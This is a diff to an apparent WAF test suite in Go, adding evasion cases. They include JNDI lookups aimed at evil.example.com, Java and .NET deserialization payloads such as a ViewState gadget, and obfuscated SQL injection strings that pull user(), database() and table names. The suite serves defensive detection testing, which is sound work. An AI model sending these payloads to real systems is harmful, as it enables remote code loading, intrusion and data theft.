@@ -535,6 +535,13 @@ var evasions = []evasion{
 	// obfuscated forms matter more than the plain one: every scanner in the wild
 	// nests lookups, and no substring of "jndi" survives "${${lower:j}ndi:".
 	{name: "jndi/plain ldap", technique: "none", arg: "${jndi:ldap://evil.example.com/a}"},
+	// No interpolation at all: the client names the naming-context environment
+	// and the application builds an InitialContext from it. SAP NetWeaver
+	// CVE-2025-42884 (KEV, 2026-11-20).
+	{name: "jndi/environment property in soap", technique: "body",
+		header: [2]string{"Content-Type", "text/xml"},
+		body: `<Envelope><Body><list><EnvironmentElement><name>java.naming.provider.url</name>` +
+			`<value>ldap://evil.example.com:1389/a</value></EnvironmentElement></list></Body></Envelope>`},
 	{name: "jndi/rmi", technique: "none", arg: "${jndi:rmi://evil.example.com/a}"},
 	{name: "jndi/dns exfil", technique: "none", arg: "${jndi:dns://evil.example.com/a}"},
 	{name: "jndi/lower obfuscation", technique: "nested-lookup",
@@ -583,8 +590,29 @@ var evasions = []evasion{
 	{name: "javaser/base64 in json", technique: "body",
 		body: `{"state":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"}`},
 	{name: "javaser/raw magic", technique: "none", arg: "\xac\xed\x00\x05sr\x00\x11java.util.HashMap"},
+	// A stream long enough to be decoded as binary rather than read as text, and
+	// a raw body. Both lost the 0xACED header to printable-run extraction until
+	// the stream header was recorded on its own (2026-11-28; PeopleSoft
+	// CVE-2026-35273 is the raw form).
+	{name: "javaser/long base64 in json", technique: "base64",
+		body: `{"state":"` + base64.StdEncoding.EncodeToString(javaStream) + `"}`},
+	{name: "javaser/raw stream body", technique: "body",
+		header: [2]string{"Content-Type", "application/x-java-serialized-object"}, body: string(javaStream)},
 	{name: "javaser/spring4shell", technique: "none",
 		target: "/u?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"},
+
+	// ---- .NET serialization -------------------------------------------------
+	//
+	// BinaryFormatter graphs, bare and as a ViewState's top-level object. The
+	// ysoserial.net ViewState plugin's shape, and Idunno.AntiCsrf
+	// CVE-2026-131914's (KEV, 2026-11-24). See ruleset/core/dotnetser.go.
+	{name: "dotnetser/base64 in json", technique: "base64",
+		body: `{"data":"` + base64.StdEncoding.EncodeToString(binaryFormatterStream) + `"}`},
+	{name: "dotnetser/viewstate gadget", technique: "base64",
+		header: [2]string{"Content-Type", "application/x-www-form-urlencoded"},
+		body:   formBody("__VIEWSTATE", viewStateGadget(), "__VIEWSTATEGENERATOR", "CA0B0334")},
+	{name: "dotnetser/raw remoting body", technique: "body",
+		header: [2]string{"Content-Type", "application/octet-stream"}, body: string(binaryFormatterStream)},
 
 	// ---- Server-side request forgery ---------------------------------------
 	//
@@ -754,6 +782,18 @@ var evasions = []evasion{
 	// Error-based exfiltration through a type error in the message.
 	{name: "sqli/gtid_subset", technique: "error-based", arg: "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)"},
 	{name: "sqli/name_const", technique: "error-based", arg: "1 UNION SELECT NAME_CONST(version(),1)"},
+
+	// SeqSQLi (Electronics 15(22):5385, 2026): a reinforcement-learning agent
+	// chaining mutation operators reached a 92.6% false-negative rate against
+	// ModSecurity with CRS. These are the paper's own examples and its
+	// reported winning chain (case, newline, NBSP before a call's parenthesis,
+	// NUL terminating the comment). Each is a surface rewrite the SQL grammar
+	// reads straight through, which is the property a regex lacks.
+	{name: "sqli/seqsqli comment split", technique: "comment", arg: "1'/**/UnIoN/**/SeLeCt user(),2,3-- -"},
+	{name: "sqli/seqsqli newline split", technique: "whitespace", arg: "1'\nUNION\nSELECT user(),2,3-- -"},
+	{name: "sqli/seqsqli nbsp call", technique: "whitespace", arg: "1'\xa0UNION\xa0SELECT\xa0database\xa0(),2,3-- -"},
+	{name: "sqli/seqsqli nul comment", technique: "null-byte", arg: "1'\fUnIoN\fSeLeCt\fuser(),2,3--\x00"},
+	{name: "sqli/seqsqli json_arrayagg", technique: "function", arg: "-1' UNION SELECT JSON_ARRAYAGG(table_name),2,3 FROM information_schema.tables-- -"},
 	{name: "artifact/config traversal", technique: "none", target: "/x?img=../wp-config.php"},
 	{name: "artifact/env traversal", technique: "none", target: "/x?f=../../.env"},
 
@@ -1104,6 +1144,13 @@ var benignTraffic = []benignCase{
 		header: [2]string{"Content-Type", "application/xml"}},
 	{name: "html5 doctype", body: `<!DOCTYPE html><html/>`,
 		header: [2]string{"Content-Type", "text/html"}},
+	// A page's own ViewState: a Pair at the top, a [Serializable] object nested
+	// inside it, and the MAC. Must pass while the top-level gadget does not.
+	{name: "webforms viewstate", header: [2]string{"Content-Type", "application/x-www-form-urlencoded"},
+		body: formBody("__VIEWSTATE", viewStateBenign(), "__VIEWSTATEGENERATOR", "CA0B0334", "__EVENTVALIDATION", "/wEdAAKmV9J1")},
+	// JNDI in prose and as a Java package in a stack trace -- the words, not the
+	// environment keys.
+	{name: "jndi in a support ticket", arg: "our JNDI lookup of java:comp/env/jdbc/orders fails after upgrade"},
 	{name: "doctype with no external ref", body: `<!DOCTYPE note><note><to>x</to></note>`,
 		header: [2]string{"Content-Type", "application/xml"}},
 	{name: "version range value", arg: "v1.2..v1.3"},
@@ -1498,7 +1545,8 @@ var declaredClasses = map[string]int{
 	"graphql":   6,
 	"jndi":      6,
 	"phpobj":    5,
-	"javaser":   3,
+	"javaser":   5,
+	"dotnetser": 3,
 	"ssrf":      6,
 	"protopoll": 3,
 
